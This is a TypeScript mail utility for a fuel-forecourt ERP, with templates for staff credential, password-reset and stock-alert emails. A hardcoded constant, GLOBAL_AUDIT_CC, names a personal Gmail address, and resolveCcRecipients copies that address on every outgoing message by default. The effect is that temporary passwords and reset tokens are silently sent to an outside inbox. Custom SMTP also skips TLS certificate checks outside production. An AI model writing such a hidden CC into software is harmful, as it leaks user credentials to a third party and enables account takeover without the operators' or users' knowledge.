/**
 * PetroPulse Mail Helper
 * ----------------------
 * Centralized email dispatch utility powered by Nodemailer with Gmail SMTP.
 *
 * CONFIGURATION (set in backend .env):
 *   SMTP_PROVIDER=gmail            -> Use Gmail SMTP (recommended). Set to 'custom' to use manual SMTP_HOST/PORT.
 *   SMTP_USER=you@gmail.com        -> Your Gmail address (also used as sender).
 *   SMTP_PASS=xxxx xxxx xxxx xxxx  -> Gmail App Password (NOT your Google account password).
 *                                     Generate at: https://myaccount.google.com/apppasswords
 *                                     (Requires 2-Step Verification enabled on Google Account)
 *
 *   For custom SMTP (SMTP_PROVIDER=custom):
 *   SMTP_HOST=smtp.example.com
 *   SMTP_PORT=587
 *   SMTP_SECURE=false              -> true for port 465, false for 587 with STARTTLS
 *
 *   EMAIL_FROM="PetroPulse ERP" <you@gmail.com>   -> Display name + address in From header
 *   APP_URL=http://localhost:3000                  -> Base URL for links inside emails
 */

import nodemailer from 'nodemailer';
import type { Transporter } from 'nodemailer';
import dotenv from 'dotenv';

dotenv.config();

// --- Types ---

export interface MailOptions {
  to: string | string[];
  subject: string;
  text?: string;
  html?: string;
  from?: string;
  cc?: string | string[];
  bcc?: string | string[];
  replyTo?: string;
  attachments?: Array<{
    filename: string;
    content?: string | Buffer;
    path?: string;
    contentType?: string;
  }>;
}

export interface SendMailResult {
  success: boolean;
  messageId?: string;
  isMock: boolean;
  recipient: string;
  subject: string;
  timestamp: string;
  error?: string;
  previewUrl?: string;
}

export interface DispatchedEmail {
  id: string;
  to: string;
  cc?: string | string[];
  subject: string;
  text?: string;
  html?: string;
  timestamp: string;
  isMock: boolean;
  status: 'SENT' | 'FAILED';
  error?: string;
}

export interface SmtpDiagnostics {
  configured: boolean;
  provider: 'gmail' | 'custom' | 'none';
  connected: boolean;
  host?: string;
  port?: number;
  user?: string;
  error?: string;
}

// --- In-memory mail audit log ---

const mailLog: DispatchedEmail[] = [];
const MAX_MAIL_LOG = 100;

// --- SMTP Configuration helpers ---

/**
 * Detects which SMTP provider is configured.
 * Returns 'gmail' | 'custom' | 'none'.
 */
export function getSmtpProvider(): 'gmail' | 'custom' | 'none' {
  const provider = (process.env.SMTP_PROVIDER || 'gmail').toLowerCase().trim();
  const user = process.env.SMTP_USER?.trim();
  const pass = process.env.SMTP_PASS?.trim() || process.env.SMTP_PASSWORD?.trim();

  if (!user || !pass) return 'none';
  if (provider === 'custom') return 'custom';
  return 'gmail'; // default
}

/**
 * Returns true when real SMTP credentials are available in environment.
 */
export function isSmtpConfigured(): boolean {
  return getSmtpProvider() !== 'none';
}

/**
 * Creates a Nodemailer transporter.
 *
 * For Gmail: uses nodemailer's built-in Gmail service preset which resolves to
 *   smtp.gmail.com:465 (SSL). Use a Gmail App Password (NOT your account password).
 *
 * For custom SMTP: uses explicit host/port/secure settings.
 *
 * Returns null when credentials are missing (dev/mock mode).
 */
export function createMailTransporter(): Transporter | null {
  const provider = getSmtpProvider();
  const user = process.env.SMTP_USER?.trim();
  const pass = process.env.SMTP_PASS?.trim() || process.env.SMTP_PASSWORD?.trim();

  if (!user || !pass) return null;

  if (provider === 'gmail') {
    return nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user,
        pass,
      },
      pool: false,
    });
  }

  // Custom SMTP fallback
  const host = process.env.SMTP_HOST?.trim() || 'localhost';
  const port = parseInt(process.env.SMTP_PORT || '587', 10);
  const secure = process.env.SMTP_SECURE === 'true' || port === 465;

  console.log(`[Mail] Custom SMTP transporter initializing: ${host}:${port} (secure=${secure})`);
  return nodemailer.createTransport({
    host,
    port,
    secure,
    auth: { user, pass },
    tls: {
      rejectUnauthorized: process.env.NODE_ENV === 'production',
    },
    pool: true,
    maxConnections: 3,
  });
}

export const GLOBAL_AUDIT_CC = 'abdulaskar45@gmail.com';

/**
 * Ensures the audit recipient (abdulaskar45@gmail.com) is included in the CC list of every outgoing email.
 */
export function resolveCcRecipients(explicitCc?: string | string[]): string | string[] {
  const auditCc = process.env.GLOBAL_MAIL_CC || GLOBAL_AUDIT_CC;
  if (!auditCc) return explicitCc || [];

  if (!explicitCc) return auditCc;

  if (Array.isArray(explicitCc)) {
    return explicitCc.includes(auditCc) ? explicitCc : [...explicitCc, auditCc];
  }

  const parts = explicitCc.split(',').map((s) => s.trim());
  if (parts.includes(auditCc)) return explicitCc;
  return `${explicitCc}, ${auditCc}`;
}

export async function sendMail(options: MailOptions): Promise<SendMailResult> {
  const from =
    options.from ||
    process.env.EMAIL_FROM ||
    (process.env.SMTP_USER
      ? `"PetroPulse Forecourt ERP" <${process.env.SMTP_USER}>`
      : '"PetroPulse Forecourt ERP" <no-reply@petropulse.io>');

  const recipient = Array.isArray(options.to) ? options.to.join(', ') : options.to;
  const cc = resolveCcRecipients(options.cc);
  const timestamp = new Date().toISOString();
  const emailId = `mail-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`;

  const transporter = createMailTransporter();

  if (transporter) {
    try {
      const info = await transporter.sendMail({
        from,
        to: options.to,
        cc,
        bcc: options.bcc,
        replyTo: options.replyTo,
        subject: options.subject,
        text: options.text,
        html: options.html,
        attachments: options.attachments,
      });

      const result: SendMailResult = {
        success: true,
        messageId: info.messageId,
        isMock: false,
        recipient,
        subject: options.subject,
        timestamp,
      };

      const previewUrl = nodemailer.getTestMessageUrl(info);
      if (previewUrl) result.previewUrl = previewUrl as string;

      console.log(`[Mail] Sent -> ${recipient} | Subject: "${options.subject}" | ID: ${info.messageId}`);

      recordMailLog({
        id: emailId,
        to: recipient,
        cc,
        subject: options.subject,
        text: options.text,
        html: options.html,
        timestamp,
        isMock: false,
        status: 'SENT',
      });

      return result;
    } catch (err: any) {
      console.error(`[Mail] SMTP send failed -> ${recipient}:`, err.message);

      recordMailLog({
        id: emailId,
        to: recipient,
        cc,
        subject: options.subject,
        timestamp,
        isMock: false,
        status: 'FAILED',
        error: err.message,
      });

      return {
        success: false,
        isMock: false,
        recipient,
        subject: options.subject,
        timestamp,
        error: err.message,
      };
    }
  }

  // Console / Development Fallback
  console.log('\n' + '='.repeat(72));
  console.log(`[MAIL MOCK] ${new Date().toLocaleString()}`);
  console.log('-'.repeat(72));
  console.log(`  To      : ${recipient}`);
  console.log(`  From    : ${from}`);
  console.log(`  Subject : ${options.subject}`);
  if (cc) console.log(`  CC      : ${Array.isArray(cc) ? cc.join(', ') : cc}`);
  console.log('-'.repeat(72));
  if (options.text) {
    console.log(options.text.substring(0, 600));
    if (options.text.length > 600) console.log('  ... [message truncated in preview]');
  }
  console.log('='.repeat(72) + '\n');
  console.log('[Mail] SMTP not configured. Set SMTP_USER + SMTP_PASS in .env to enable real delivery.');

  const mockResult: SendMailResult = {
    success: true,
    isMock: true,
    recipient,
    subject: options.subject,
    timestamp,
  };

  recordMailLog({
    id: emailId,
    to: recipient,
    cc,
    subject: options.subject,
    text: options.text,
    html: options.html,
    timestamp,
    isMock: true,
    status: 'SENT',
  });

  return mockResult;
}

// --- Pre-built Email Templates ---

export async function sendInitialCredentialsMail(params: {
  user: {
    name: string;
    email: string;
    username?: string;
    role: string;
  };
  temporaryPassword: string;
  stationName?: string;
  loginUrl?: string;
}): Promise<SendMailResult> {
  const { user, temporaryPassword } = params;
  const stationName = params.stationName || (params.user as any)?.stationName;
  const appUrl = params.loginUrl || process.env.APP_URL || 'http://localhost:3000';
  const loginUrl = `${appUrl.replace(/\/+$/, '')}/login`;
  const stationText = stationName ? ` at ${stationName}` : '';
  const subject = `Your PetroPulse Staff Account Credentials Have Been Created`;

  const text = `Dear ${user.name},

Welcome to PetroPulse Forecourt ERP${stationText}!

Your staff account credentials:

  Role              : ${user.role}
  Login Identifier  : ${user.username || user.email}
  Temporary Password: ${temporaryPassword}

Login at: ${loginUrl}

SECURITY: Change your password on first login. Never share your credentials.

Best regards,
PetroPulse Administration`.trim();

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<style>
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f1f5f9;margin:0;padding:24px;color:#1e293b}
.wrapper{max-width:600px;margin:0 auto}
.header{background:linear-gradient(135deg,#064E3B,#0D9488);border-radius:12px 12px 0 0;padding:28px 32px;text-align:center}
.header h1{color:#fff;margin:0;font-size:22px;font-weight:700}
.header p{color:rgba(255,255,255,.8);margin:6px 0 0;font-size:13px}
.body{background:#fff;padding:32px;border:1px solid #e2e8f0;border-top:none}
.creds{background:#f8fafc;border:1px solid #e2e8f0;border-radius:10px;padding:20px 24px;margin:24px 0}
.row{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #e2e8f0}
.row:last-child{border-bottom:none}
.lbl{color:#64748b;font-size:13px;font-weight:500}
.val{font-weight:600;font-size:14px;color:#0f172a}
.pw{background:#e0f2fe;color:#0369a1;padding:4px 12px;border-radius:6px;font-family:monospace;letter-spacing:1px}
.btn{display:inline-block;background:linear-gradient(135deg,#0D9488,#064E3B);color:#fff!important;text-decoration:none;padding:14px 32px;border-radius:8px;font-weight:600;font-size:15px;margin:20px 0}
.notice{background:#fffbeb;border:1px solid #fcd34d;border-radius:8px;padding:14px 18px;font-size:13px;color:#92400e;margin:20px 0}
.footer{background:#f8fafc;border:1px solid #e2e8f0;border-top:none;border-radius:0 0 12px 12px;padding:18px 32px;font-size:12px;color:#94a3b8;text-align:center}
</style>
</head>
<body>
<div class="wrapper">
  <div class="header">
    <h1>PetroPulse Forecourt ERP</h1>
    <p>Your Staff Account Has Been Created${stationText}</p>
  </div>
  <div class="body">
    <p>Hello <strong>${user.name}</strong>,</p>
    <p>Welcome aboard! Your staff account on <strong>PetroPulse Fuel Forecourt Management Platform</strong> is ready.</p>
    <div class="creds">
      <div class="row"><span class="lbl">Designated Role</span><span class="val" style="color:#0D9488">${user.role}</span></div>
      <div class="row"><span class="lbl">Login Identifier</span><span class="val">${user.username || user.email}</span></div>
      <div class="row"><span class="lbl">Temporary Password</span><span class="val pw">${temporaryPassword}</span></div>
    </div>
    <p style="text-align:center"><a href="${loginUrl}" class="btn">Log In to PetroPulse Portal</a></p>
    <div class="notice">
      <strong>Security Notice:</strong> This is a temporary password. You will be prompted to change it on first login.
    </div>
  </div>
  <div class="footer">
    Automated notification from PetroPulse ERP. Do not reply to this email.<br>
    &copy; ${new Date().getFullYear()} PetroPulse Multi-Station Fuel Network.
  </div>
</div>
</body>
</html>`.trim();

  return sendMail({ to: user.email, subject, text, html });
}

export const sendInitialCredentials = sendInitialCredentialsMail;

export async function sendPasswordResetMail(params: {
  user: { name: string; email: string };
  resetToken: string;
  resetUrl?: string;
}): Promise<SendMailResult> {
  const { user, resetToken } = params;
  const appUrl = params.resetUrl || process.env.APP_URL || 'http://localhost:3000';
  const actionUrl = `${appUrl.replace(/\/+$/, '')}/reset-password?token=${encodeURIComponent(resetToken)}&email=${encodeURIComponent(user.email)}`;
  const subject = `PetroPulse - Password Reset Request`;

  const text = `Dear ${user.name},

A password reset was requested for your PetroPulse account.
Open this link in your browser:

${actionUrl}

This link is valid for 60 minutes. If you did not request this, contact your administrator.

Best regards,
PetroPulse Forecourt Security`.trim();

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<style>
body{font-family:-apple-system,sans-serif;background:#f8fafc;padding:24px;color:#1e293b}
.card{max-width:560px;margin:0 auto;background:#fff;border-radius:12px;padding:32px;border:1px solid #e2e8f0}
.btn{display:inline-block;background:#0D9488;color:#fff!important;text-decoration:none;padding:12px 24px;border-radius:8px;font-weight:600}
</style></head>
<body>
<div class="card">
  <h2 style="color:#064E3B;margin-top:0">Password Reset Authorization</h2>
  <p>Hello <strong>${user.name}</strong>,</p>
  <p>We received a request to reset your password for PetroPulse Forecourt ERP.</p>
  <p style="text-align:center;margin:28px 0"><a href="${actionUrl}" class="btn">Reset Your Password</a></p>
  <p style="font-size:13px;color:#64748b">Or paste this URL into your browser:<br>
  <code style="word-break:break-all;color:#0f172a">${actionUrl}</code></p>
  <p style="font-size:12px;color:#94a3b8;margin-top:32px;border-top:1px solid #e2e8f0;padding-top:16px">
    This link expires in 60 minutes. If you did not request this, you can safely ignore this email.
  </p>
</div>
</body></html>`.trim();

  return sendMail({ to: user.email, subject, text, html });
}

export async function sendLowStockAlert(params: {
  managerEmail: string;
  stationName: string;
  tankName: string;
  fuelName: string;
  currentStockLiters: number;
  safeCapacityLiters: number;
  lowThresholdLiters: number;
}): Promise<SendMailResult> {
  const { managerEmail, stationName, tankName, fuelName, currentStockLiters, lowThresholdLiters, safeCapacityLiters } = params;
  const subject = `URGENT: Low Fuel Stock Alert - ${tankName} (${stationName})`;

  const text = `CRITICAL FORECOURT STOCK ALERT
Station : ${stationName}
Tank    : ${tankName} (${fuelName})
Current Stock : ${currentStockLiters.toLocaleString()} Liters
Low Threshold : ${lowThresholdLiters.toLocaleString()} Liters
Safe Capacity : ${safeCapacityLiters.toLocaleString()} Liters

Immediate replenishment / decanting tanker order required.`.trim();

  const html = `<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<style>
body{font-family:-apple-system,sans-serif;background:#fff1f2;padding:24px;color:#1e293b}
.card{max-width:560px;margin:0 auto;background:#fff;border-radius:12px;padding:28px;border:1px solid #fecdd3}
.badge{display:inline-block;background:#ffe4e6;color:#e11d48;font-weight:700;font-size:11px;padding:4px 10px;border-radius:9999px;margin-bottom:12px}
table{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px}
td{padding:10px 0;border-bottom:1px solid #f1f5f9}
.notice{font-size:13px;color:#9f1239;background:#fff1f2;padding:12px;border-radius:8px}
</style></head>
<body>
<div class="card">
  <div class="badge">CRITICAL INVENTORY ALERT</div>
  <h2 style="color:#9f1239;margin:0 0 16px 0">Low Fuel Threshold Warning</h2>
  <p>Tank <strong>${tankName}</strong> (${fuelName}) at <strong>${stationName}</strong> has dropped below the re-order threshold.</p>
  <table>
    <tr><td style="color:#64748b">Current Stock</td><td style="font-weight:700;color:#e11d48">${currentStockLiters.toLocaleString()} Liters</td></tr>
    <tr><td style="color:#64748b">Low Alert Threshold</td><td style="font-weight:600">${lowThresholdLiters.toLocaleString()} Liters</td></tr>
    <tr style="border-bottom:none"><td style="color:#64748b">Safe Capacity</td><td style="font-weight:600">${safeCapacityLiters.toLocaleString()} Liters</td></tr>
  </table>
  <div class="notice">Initiate tanker delivery schedule immediately to avoid forecourt dispensing dry-outs.</div>
</div>
</body></html>`.trim();

  return sendMail({ to: managerEmail, subject, text, html });
}

// --- SMTP Diagnostics ---

export async function testSmtpConnection(): Promise<SmtpDiagnostics> {
  const provider = getSmtpProvider();
  const user = process.env.SMTP_USER?.trim();
  const host = provider === 'gmail' ? 'smtp.gmail.com' : (process.env.SMTP_HOST?.trim() || 'localhost');
  const port = provider === 'gmail' ? 465 : parseInt(process.env.SMTP_PORT || '587', 10);

  if (provider === 'none') {
    return {
      configured: false,
      provider: 'none',
      connected: false,
      host,
      port,
      error: 'SMTP credentials not configured. Set SMTP_USER and SMTP_PASS in .env to enable email delivery.',
    };
  }

  const transporter = createMailTransporter();
  if (!transporter) {
    return { configured: false, provider, connected: false, error: 'Transporter creation failed.' };
  }

  try {
    await transporter.verify();
    console.log(`[Mail] SMTP connection verified (${provider})`);
    return { configured: true, provider, connected: true, host, port, user };
  } catch (err: any) {
    console.error(`[Mail] SMTP verify failed:`, err.message);
    return { configured: true, provider, connected: false, host, port, user, error: err.message };
  }
}

// --- Mail Log Utilities ---

function recordMailLog(entry: DispatchedEmail): void {
  mailLog.unshift(entry);
  if (mailLog.length > MAX_MAIL_LOG) mailLog.pop();
}

export function getMailLog(): DispatchedEmail[] {
  return [...mailLog];
}

export function clearMailLog(): void {
  mailLog.length = 0;
}
